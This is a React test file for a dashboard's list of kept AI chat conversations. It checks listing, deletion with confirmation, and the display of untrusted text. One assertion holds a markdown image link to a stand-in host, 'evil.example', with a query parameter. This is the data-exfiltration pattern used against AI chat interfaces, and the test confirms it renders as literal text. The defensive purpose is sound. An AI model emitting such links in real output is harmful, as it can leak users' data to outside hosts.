import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import { render, screen, waitFor, within } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { setupServer } from "msw/node";
import { afterAll, afterEach, beforeAll, beforeEach, describe, expect, it } from "vitest";

import { TooltipProvider } from "@/components/ui/overlays";
import { V2_DASHBOARD_IDS } from "@/mocks/dashboards";
import { createHandlers } from "@/mocks/handlers";
import { MOCK_SESSION_KEY, mockCsrfToken, PERSONAS } from "@/mocks/tenancy";
import { useAuth } from "@/stores/auth";
import { useScope } from "@/stores/scope";

import { ChatTranscripts } from "./chat-transcripts";

let server = setupServer(...createHandlers());
const seen: Request[] = [];
function listen() {
  server.listen({ onUnhandledRequest: "bypass" });
  server.events.on("request:start", ({ request }) => {
    seen.push(request.clone());
  });
}
beforeAll(() => {
  listen();
  window.scrollTo = () => undefined;
});
beforeEach(() => {
  // A fresh mock state: one kept conversation on the forecast dashboard (a share link's, hostile text).
  server.close();
  server = setupServer(...createHandlers());
  listen();
  seen.length = 0;
});
afterEach(() => useAuth.setState({ mode: "unknown", csrf: null }));
afterAll(() => server.close());

const T = { timeout: 10_000 };

function renderList(dashboardId: string, keeping = true) {
  localStorage.setItem(MOCK_SESSION_KEY, "ana");
  useAuth.setState({ mode: "session", csrf: mockCsrfToken(PERSONAS.ana!) });
  useScope.setState({ active: { tenantId: "acme", projectId: "retail" }, preferred: null, recent: [] });
  const qc = new QueryClient({ defaultOptions: { queries: { retry: false } } });
  return render(
    <QueryClientProvider client={qc}>
      <TooltipProvider>
        <ChatTranscripts dashboardId={dashboardId} keeping={keeping} />
      </TooltipProvider>
    </QueryClientProvider>,
  );
}

describe("builder › kept conversations", () => {
  it("lists a conversation by who asked (never an address), and shows its untrusted text as text", async () => {
    const user = userEvent.setup();
    renderList(V2_DASHBOARD_IDS.forecast);
    const row = await screen.findByTestId("chat-transcript-row", undefined, T);
    expect(row.textContent).toContain("Share link Weekly visits");
    expect(row.textContent).toContain("Share link");
    expect(row.textContent).not.toMatch(/\d+\.\d+\.\d+\.\d+/);

    await user.click(within(row).getByRole("button", { name: /Read the conversation of Share link Weekly visits/ }));
    const dialog = await screen.findByTestId("chat-transcript-dialog");
    const question = await within(dialog).findByTestId("chat-transcript-turn-user", undefined, T);
    // markdown, HTML and the image link stay literal text: no element is made from them
    expect(question.textContent).toContain("![x](https://evil.example/?d=1) <b>now</b>");
    expect(dialog.querySelector("img, a, b, script, iframe")).toBeNull();
    const answer = within(dialog).getByTestId("chat-transcript-turn-assistant");
    expect(within(answer).getByLabelText("Tools used").textContent).toContain("get_latest_readout");
  });

  it("deletes a conversation after a confirmation", async () => {
    const user = userEvent.setup();
    renderList(V2_DASHBOARD_IDS.forecast);
    const row = await screen.findByTestId("chat-transcript-row", undefined, T);
    const id = row.getAttribute("data-conversation");
    await user.click(within(row).getByRole("button", { name: /Read the conversation/ }));
    const dialog = await screen.findByTestId("chat-transcript-dialog");
    await user.click(within(dialog).getByRole("button", { name: /Delete conversation/ }));
    expect(within(dialog).getByText(/You cannot undo this/)).toBeTruthy();
    expect(seen.some((r) => r.method === "DELETE")).toBe(false);
    await user.click(within(dialog).getByRole("button", { name: /Delete now/ }));
    await waitFor(() => expect(screen.queryByTestId("chat-transcript-dialog")).toBeNull(), T);
    expect(seen.some((r) => r.method === "DELETE" && r.url.endsWith(`/chat/transcripts/${id}`))).toBe(true);
    await waitFor(() => expect(screen.queryByTestId("chat-transcript-row")).toBeNull(), T);
    expect(screen.getByText(/No kept conversations yet/)).toBeTruthy();
  });

  it("says when the dashboard keeps no conversations", async () => {
    renderList(V2_DASHBOARD_IDS.classifier, false);
    expect(await screen.findByText(/This dashboard keeps no conversations/, undefined, T)).toBeTruthy();
  });
});
